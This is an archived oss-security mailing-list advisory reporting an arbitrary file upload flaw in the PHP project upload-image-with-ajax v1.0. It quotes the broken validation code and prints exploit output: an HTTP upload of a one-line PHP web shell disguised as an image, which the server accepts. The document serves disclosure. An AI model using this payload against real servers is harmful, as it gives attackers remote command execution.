X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1805" "Monday" "23" "December" "2019" "12:09:16" "-0500" "Larry W. Cashdollar" "larry0@me.com" nil "59" nil "^Date:" nil nil "12" nil nil (number mark "        larry0@me.co Dec 23   59/1805  " thread-indent "\"[oss-security] Arbitrary file upload vulnerability in upload-image-with-ajax v1.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Arbitrary file upload vulnerability in upload-image-with-ajax v1.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 23579 invoked by uid 550); 23 Dec 2019 17:09:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 23559 invoked from network); 23 Dec 2019 17:09:31 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
	t=1577120959; bh=9F3+Bazit9tRpk82INr3lclkeFkIh1cAJWYYyRqMFI4=;
	h=Date:Subject:From:To:Message-ID:Content-type;
	b=lrfKyZqWpJO9HM1DVsh9/0a6koLHezaI8owlcSrNZPMYUsYT1bww0w6gMik1sQDGt
	 NbzrVbW/2VHhNy0I2kjtEQ+5prDFOJyR9S6WlG+kaPinP8eHPldvhaQL+YyErIVnZ/
	 xGoh42W/9Zgf48x930v5a9qx5Cayb2qh5VhkuhOc2KUy6AIpy/7YNgoxMP3nn+8PmL
	 Zlva7SsecZQTIuJBE36c35QUDets+/bNhO6hFoWf9qu8n8eQlValwJbtoVlDm9/9cN
	 KS/7UPyhFJryynJr25KbEHMhbU2L8A9YOu2ECZHk/DDfvDvYUjScbc3rFllJSzFQer
	 NLlet5AsG1DqA==
User-Agent: Microsoft-MacOutlook/10.20.0.191208
Message-ID: <E98B12D6-2DD9-43AA-A854-DD45B36AC5C5@me.com>
Thread-Topic: Arbitrary file upload vulnerability in upload-image-with-ajax
 v1.0
Mime-version: 1.0
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: 7bit
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,, definitions=2019-12-23_07:,,
 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=691 adultscore=0 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.0.1-1908290000 definitions=main-1912230146
Date: Mon, 23 Dec 2019 12:09:16 -0500
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Arbitrary file upload vulnerability in upload-image-with-ajax v1.0
To: Open Security <oss-security@lists.openwall.com>

Title: Arbitrary file upload vulnerability in upload-image-with-ajax
Author: Larry W. Cashdollar
Date: 2019-12-16
CVE-ID:[CVE-2019-8292]
Download Site: https://github.com/abcprintf/upload-image-with-ajax/
Vendor: adcprintf
Vendor Notified: 2019-12-16
Vendor Contact: wh.cprintf@gmail.com
Advisory: http://www.vapidlabs.com/advisory.php?v=211
Description: upload-image-with-ajax
Vulnerability:
The code below changes the $ready flag to true if the file conforms to the size of < 1000000. Reversing the check that the file is an image. So, a .php file can be uploaded with only a warning allowing code execution.

$ready = false;
if((($imageType == "image/jpeg") || ($imageType == "image/jpg") || ($imageType == "image/png"))&&in_array($fileExt, $validext)){
$ready = true;
}else{
echo "was not an image
";
/You should abort the upload right here/
}
if($_FILES["fileUpload"]["size"] < 1000000){
$ready = true;
echo "file size is ".$_FILES['fileUpload']["size"]."
";
}else{
echo "file was TOO BIG!";
}

Exploit Code:
 $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.php
POST request size is 469 bytes
 
Sending Payload:
POST //upload-image-with-ajax/upload.php HTTP/1.1
Host: 192.168.0.3
User-Agent: File Upload Exploiter/v1.2
Accept: */*
Content-Length: 237
Content-Type: multipart/form-data; boundary=------------------------c8e05c8871143853
 
--------------------------c8e05c8871143853
Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"
Content-Type: image/jpeg
 
<?php $cmd=$_GET['cmd']; system($cmd);?>
 
--------------------------c8e05c8871143853--
 
HTTP/1.1 200 OK
Date: Mon, 16 Dec 2019 04:39:56 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 37
Content-Type: text/html; charset=UTF-8
 
file size is 42<br>upload successful!
[+] Total bytes read: 185


